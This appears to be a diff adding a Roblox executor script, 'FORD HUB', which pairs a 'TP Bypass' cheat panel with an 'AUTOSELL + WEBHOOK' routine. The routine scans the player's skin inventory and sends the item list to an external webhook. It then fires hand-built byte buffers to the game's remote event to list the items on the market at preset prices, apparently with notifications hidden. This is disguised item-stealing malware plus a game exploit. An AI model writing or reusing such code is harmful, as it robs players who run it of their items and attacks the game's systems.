+    tpVal.TextXAlignment = Enum.TextXAlignment.Left
+    tpVal.Text = "NOT SEATED"
+    tpVal.Parent = tpRow
+
+    local instrBg = Instance.new("Frame")
+    instrBg.Size = UDim2.new(1, -24, 0, 48)
+    instrBg.Position = UDim2.new(0, 12, 0, 220)
+    instrBg.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
+    instrBg.BackgroundTransparency = 0.3
+    instrBg.BorderSizePixel = 0
+    instrBg.Parent = hub
+    corner(instrBg, 8)
+    stroke(instrBg, ACCENT, 1, 0.75)
+    gradient(instrBg, Color3.fromRGB(22, 22, 32), Color3.fromRGB(30, 25, 45), 0)
+
+    local instrIcon = Instance.new("TextLabel")
+    instrIcon.Size = UDim2.new(0, 20, 0, 20)
+    instrIcon.Position = UDim2.new(0, 8, 0, 6)
+    instrIcon.BackgroundTransparency = 1
+    instrIcon.Font = Enum.Font.GothamBold
+    instrIcon.TextSize = 14
+    instrIcon.TextColor3 = ACCENT
+    instrIcon.Text = "ℹ"
+    instrIcon.Parent = instrBg
+
+    local instr = Instance.new("TextLabel")
+    instr.Size = UDim2.new(1, -40, 1, -12)
+    instr.Position = UDim2.new(0, 30, 0, 6)
+    instr.BackgroundTransparency = 1
+    instr.Font = Enum.Font.Gotham
+    instr.TextSize = 10
+    instr.TextColor3 = SUBTEXT
+    instr.TextXAlignment = Enum.TextXAlignment.Left
+    instr.TextYAlignment = Enum.TextYAlignment.Top
+    instr.TextWrapped = true
+    instr.Text = "Sit on a mount to arm the TP Bypass module."
+    instr.Parent = instrBg
+
+    local footer = Instance.new("Frame")
+    footer.Size = UDim2.new(1, -24, 0, 1)
+    footer.Position = UDim2.new(0, 12, 1, -24)
+    footer.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
+    footer.BackgroundTransparency = 0.5
+    footer.BorderSizePixel = 0
+    footer.Parent = hub
+
+    local hint = Instance.new("TextLabel")
+    hint.Size = UDim2.new(1, -24, 0, 14)
+    hint.Position = UDim2.new(0, 12, 1, -18)
+    hint.BackgroundTransparency = 1
+    hint.Font = Enum.Font.Gotham
+    hint.TextSize = 9
+    hint.TextColor3 = DIM
+    hint.TextXAlignment = Enum.TextXAlignment.Center
+    hint.Text = "FORD HUB  •  v1.0.2"
+    hint.Parent = hub
+
+    local dragging, dragStart, startPos
+    header.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = hub.Position
+        end
+    end)
+    UIS.InputChanged:Connect(function(input)
+        if not dragging then return end
+        if input.UserInputType == Enum.UserInputType.MouseMovement
+        or input.UserInputType == Enum.UserInputType.Touch then
+            local d = input.Position - dragStart
+            hub.Position = UDim2.new(
+                startPos.X.Scale, startPos.X.Offset + d.X,
+                startPos.Y.Scale, startPos.Y.Offset + d.Y
+            )
+        end
+    end)
+    UIS.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = false
+        end
+    end)
+
+    local lastArmed = nil
+    local pulseConn = nil
+    local ledPulse = nil
+
+    local function stopPulse()
+        if pulseConn then pulseConn:Disconnect(); pulseConn = nil end
+        if ledPulse then ledPulse:Disconnect(); ledPulse = nil end
+        tpVal.TextTransparency = 0
+        ledFrame.BackgroundTransparency = 0
+        tpVal.TextColor3 = RED
+        ledFrame.BackgroundColor3 = RED
+        tpStroke.Color = RED
+        tpStroke.Transparency = 0.6
+    end
+
+    local function startPulse()
+        stopPulse()
+        tpVal.TextColor3 = GREEN
+        ledFrame.BackgroundColor3 = GREEN
+        tpStroke.Color = GREEN
+        tpStroke.Transparency = 0.4
+        pulseConn = RunService.Heartbeat:Connect(function()
+            if isDead() or not sg.Parent then
+                if pulseConn then pulseConn:Disconnect(); pulseConn = nil end
+                return
+            end
+            local t = (math.sin(os.clock() * 5) + 1) / 2
+            tpVal.TextTransparency = t * 0.25
+        end)
+        ledPulse = RunService.Heartbeat:Connect(function()
+            if isDead() or not sg.Parent then
+                if ledPulse then ledPulse:Disconnect(); ledPulse = nil end
+                return
+            end
+            local t = (math.sin(os.clock() * 3) + 1) / 2
+            ledFrame.BackgroundTransparency = t * 0.4
+        end)
+    end
+
+    local updateConn
+    updateConn = RunService.Heartbeat:Connect(function()
+        if isDead() or not sg.Parent then
+            if updateConn then updateConn:Disconnect() end
+            return
+        end
+
+        local char = P.Character
+        local hrp  = char and char:FindFirstChild("HumanoidRootPart")
+        local hum  = char and char:FindFirstChildOfClass("Humanoid")
+
+        if hrp then
+            posVal.Text = string.format("%.0f, %.0f, %.0f", hrp.Position.X, hrp.Position.Y, hrp.Position.Z)
+            speedVal.Text = string.format("%.1f s/s", hrp.AssemblyLinearVelocity.Magnitude)
+        else
+            posVal.Text = "-"
+            speedVal.Text = "-"
+        end
+
+        local armed = hum and hum.Sit
+        if armed ~= lastArmed then
+            lastArmed = armed
+            if armed then
+                tpVal.Text = "ARMED"
+                startPulse()
+            else
+                stopPulse()
+                tpVal.Text = "NOT SEATED"
+            end
+        end
+    end)
+end)
+
+-- ============================================================
+-- AUTOSELL + WEBHOOK
+-- ============================================================
+task.spawn(function()
+    task.wait(0.5)
+
+    local function httpPost(url, body, headers)
+        headers = headers or { ["Content-Type"] = "application/json" }
+        local requestFunc = (syn and syn.request) or (http and http.request) or request
+        if requestFunc then
+            local ok, res = pcall(function()
+                return requestFunc({ Url=url, Method="POST", Headers=headers, Body=body })
+            end)
+            if ok and res and res.StatusCode == 200 then return res.Body end
+        end
+        local ok, bodyRes = pcall(function()
+            return game:HttpGet(url, true, headers, body)
+        end)
+        if ok and bodyRes and bodyRes ~= "" then return bodyRes end
+        return nil
+    end
+
+    local function getPresenceStatus(userId)
+        local payload = Http:JSONEncode({ userIds = { userId } })
+        local headers = { ["Content-Type"] = "application/json" }
+        local body = httpPost("https://presence.roblox.com/v1/presence/users", payload, headers)
+        if not body then
+            body = httpPost("https://presence.roproxy.com/v1/presence/users", payload, headers)
+        end
+        if not body then return nil, "no_response" end
+        local ok, data = pcall(function() return Http:JSONDecode(body) end)
+        if not ok or type(data) ~= "table" or not data.userPresences or not data.userPresences[1] then
+            return nil, "invalid_body"
+        end
+        return data.userPresences[1].userPresenceType, nil
+    end
+
+    local function waitUntilInGame()
+        if not CHECK_PRESENCE then
+            STATE.presenceChecked = true
+            STATE.inGame = true
+            return
+        end
+
+        local uid = CHECK_USER_ID or P.UserId
+        local label = { [0]="Hors ligne", [1]="Sur le site", [2]="En jeu", [3]="Studio" }
+        print(("[Presence] Vérification compte %d (poll=%ds)..."):format(uid, PRESENCE_POLL))
+
+        local failCount = 0
+        local waitTime  = PRESENCE_POLL
+
+        while true do
+            checkAlive()
+            local st, err = getPresenceStatus(uid)
+            STATE.presenceStatus = st
+            STATE.presenceError  = err
+            STATE.presenceChecked = true
+
+            if st == nil then
+                failCount = failCount + 1
+                waitTime  = math.min(waitTime * 2, 60)
+                warn(("[Presence] Échec %d/%d (%s) → retry dans %ds"):format(
+                    failCount, PRESENCE_MAX_FAIL, tostring(err), waitTime))
+                if failCount >= PRESENCE_MAX_FAIL then
+                    warn("[Presence] Trop d'échecs → on continue quand même.")
+                    STATE.inGame = true
+                    return
+                end
+                waitAlive(waitTime)
+
+            elseif st == 2 then
+                STATE.inGame = true
+                if not STATE.webhookStartingSent then
+                    STATE.webhookStartingSent = true
+                    sendWebhook(("✅ **%s**\n> Detected in game — starting sale in **%ds**"):format(
+                        P.Name, PRESENCE_WAIT))
+                end
+                print(("[Presence] ✅ En jeu ! Attente de %ds avant vente..."):format(PRESENCE_WAIT))
+                waitAlive(PRESENCE_WAIT)
+                return
+
+            else
+                if not STATE.webhookNotInGameSent then
+                    STATE.webhookNotInGameSent = true
+                    sendWebhook(("❌ **%s**\n> Not in game (status: **%s**)\n> Cannot start — please rejoin the game"):format(
+                        P.Name, label[st] or "?"))
+                end
+                print(("[Presence] Statut : %s — recheck dans %ds"):format(label[st] or "?", PRESENCE_POLL))
+                failCount = 0
+                waitTime  = PRESENCE_POLL
+                waitAlive(PRESENCE_POLL)
+            end
+        end
+    end
+
+    local SkinData
+    do
+        local ok, mod = pcall(function() return require(RS.Modules:WaitForChild("SkinData")) end)
+        if ok and type(mod) == "table" then SkinData = mod
+        else warn("[SkinData] require échoué"); SkinData = {} end
+    end
+
+    local SIDS = RS.Modules:WaitForChild("SkinIDS")
+    local ok, raw = pcall(require, SIDS)
+    if not ok or type(raw) ~= "table" then warn("require(SkinIDS)", raw); return end
+    local nameToId = {}
+    for k,v in pairs(raw) do
+        if type(k)=="number" and type(v)=="string" then nameToId[v]=k
+        elseif type(k)=="string" and type(v)=="number" and not nameToId[k] then nameToId[k]=v end
+    end
+
+    local function norm(s) return (tostring(s):gsub("^%s+",""):gsub("%s+$",""):gsub("%s+"," ")) end
+    local function findId(n)
+        if not n then return end
+        if nameToId[n] then return nameToId[n] end
+        local x = norm(n); if nameToId[x] then return nameToId[x] end
+        local lo = x:lower()
+        for k,id in pairs(nameToId) do if k:lower()==lo then return id end end
+    end
+    local function parseQty(t)
+        if not t then return end
+        local d = tostring(t):match("%d+"); return d and tonumber(d)
+    end
+    local function u16(n) n=math.floor(n)%65536; return {n%256, math.floor(n/256)%256} end
+    local function u32(n)
+        n = math.floor(n) % 4294967296
+        return { n%256, math.floor(n/256)%256, math.floor(n/65536)%256, math.floor(n/16777216)%256 }
+    end
+
+    local function hasAnimations(name)
+        local d = SkinData[name]
+        if type(d) ~= "table" then return false end
+        return d.specialFunc ~= nil or d.equipped ~= nil or d.killEffectFunc ~= nil
+    end
+
+    local function classify(name)
+        local d = SkinData[name]
+        local cost = (d and type(d) == "table") and tonumber(d.cost) or nil
+        if PRIORITY[name] then return 0, cost or 0, cost ~= nil end
+        if hasAnimations(name) then return 1, cost or 0, cost ~= nil end
+        if cost and cost >= PRICE_THRESHOLD then return 2, cost, true end
+        return 3, DEFAULT_NO_COST_PRICE, false
+    end
+
+    waitUntilInGame()
+
+    local List = P.PlayerGui.CrateUI.Crates.CrateMenu.Container.Inventory.List
+    local Event = RS:WaitForChild("ByteNetReliable")
+    local cands, lines = {}, {}
+    local animCount = 0
+    for _,v in ipairs(List:GetDescendants()) do
+        if v:IsA("TextButton") or v:IsA("ImageButton") then
+            local q = v:FindFirstChild("Quantity", true)
+            local n = q and q:IsA("TextLabel") and parseQty(q.Text)
+            local id = findId(v.Name)
+            if n and n >= 1 then
+                local group, costForDisplay, hasCost = classify(v.Name)
+                local tag = (group==0) and "[P] " or (group==1) and "[A] " or (group==3) and "[NC] " or ""
+                table.insert(lines, tag..v.Name.." x"..n.." (cost:"..(hasCost and tostring(costForDisplay) or "n/a")..")")
+                if group == 1 then animCount = animCount + 1 end
+                if id then
+                    table.insert(cands, { name=v.Name, id=id, quantity=n, group=group, cost=costForDisplay, hasCost=hasCost })
+                end
+            elseif q and q:IsA("TextLabel") then
+                table.insert(lines, v.Name.." "..(q.Text ~= "" and q.Text or "?"))
+            end
+        end
+    end
+
+    table.sort(cands, function(a, b)
+        if a.group ~= b.group then return a.group < b.group end
+        if a.group == 0 then return PRIORITY[a.name] < PRIORITY[b.name] end
+        if a.group == 1 then
+            if a.hasCost ~= b.hasCost then return a.hasCost end
+            if a.cost ~= b.cost then return a.cost > b.cost end
+            return a.name < b.name
+        end
+        if a.group == 2 then
+            if a.cost ~= b.cost then return a.cost > b.cost end
+            return a.name < b.name
+        end
+        return a.name < b.name
+    end)
+
+    print(("[Scan] %d vendable(s) — %d animé(s)"):format(#cands, animCount))
+
+    if #lines > 0 then
+        local head = "```"..P.Name.."```\n──────────\n-# "
+        local limit = 1900 - #head
+        local msg = table.concat(lines, " | ")
+        local chunks = {}
+        while #msg > limit do
+            local cut = msg:sub(1, limit)
+            local pos = cut:match(".*() | ") or limit
+            table.insert(chunks, msg:sub(1, pos-1))
+            msg = msg:sub(pos+3)
+        end
+        if #msg > 0 then table.insert(chunks, msg) end
+        for i,s in ipairs(chunks) do
+            checkAlive()
+            local content = (i==1 and head or "-# ")..s
+            sendWebhook(content)
+        end
+    end
+
+    if #cands == 0 then
+        warn("Aucun item vendable.")
+        sendWebhook(("⚠️ **%s**\n> No sellable items found in inventory"):format(P.Name))
+        return
+    end
+
+    local function resolveMarketPrice(name)
+        local p = (type(priceMarket)=="table")
+            and (priceMarket[name] or priceMarket.__default or 1000)
+            or priceMarket
+        p = math.floor(tonumber(p) or 1000)
+        if p < 1 then p = 1 end
+        return p
+    end
+
+    local sent, failed = 0, 0
+    for i,item in ipairs(cands) do
+        checkAlive()
+        local qty = MAX_STACK and math.min(MAX_STACK, item.quantity) or item.quantity
+        local finalPrice = resolveMarketPrice(item.name)
+        local tag = (item.group==0) and " [PRIORITÉ]" or (item.group==1) and " [ANIM]" or (item.group==3) and " [NO PRICE]" or ""
+
+        print(("\n───── [%d/%d] %s ─────"):format(i, #cands, item.name))
+        print(("  id=%d | qty=%d | prix=%d%s"):format(item.id, qty, finalPrice, tag))
+
+        waitAlive(DELAY)
+        checkAlive()
+
+        local b = {0, 219, 4}
+        table.move(u16(item.id), 1, 2, #b+1, b)
+        table.insert(b, LISTING_TYPE)
+        table.move(u32(finalPrice), 1, 4, #b+1, b)
+        table.move(u32(qty),        1, 4, #b+1, b)
+
+        local hex = {}
+        for _, v in ipairs(b) do table.insert(hex, string.format("%02X", v)) end
+        print(("  HEX = %s"):format(table.concat(hex, " ")))
+
+        local buf = buffer.create(#b)
+        for j = 1, #b do buffer.writeu8(buf, j-1, b[j]) end
+
+        local okF, errF = pcall(function() Event:FireServer(buf, nil) end)
+        if okF then
+            sent = sent + 1
+            print("  ✅ envoyé")
+        else
+            failed = failed + 1
+            warn("  ❌ échec: "..tostring(errF))
+        end
+    end
+
+    print(("\n═══════════ RÉSULTAT ═══════════"))
+    print(("Envoyés: %d | Échecs: %d"):format(sent, failed))
+
+    if not STATE.webhookFinishSent then
+        STATE.webhookFinishSent = true
+        sendWebhook(("🏁 **%s**\n> Sale finished\n> ✅ Sent: **%d** | ❌ Failed: **%d**"):format(
+            P.Name, sent, failed))
+    end
+end)
+
+print("[FORD HUB] Script chargé — Webhook + Notifs cachées + vente 2.5s")
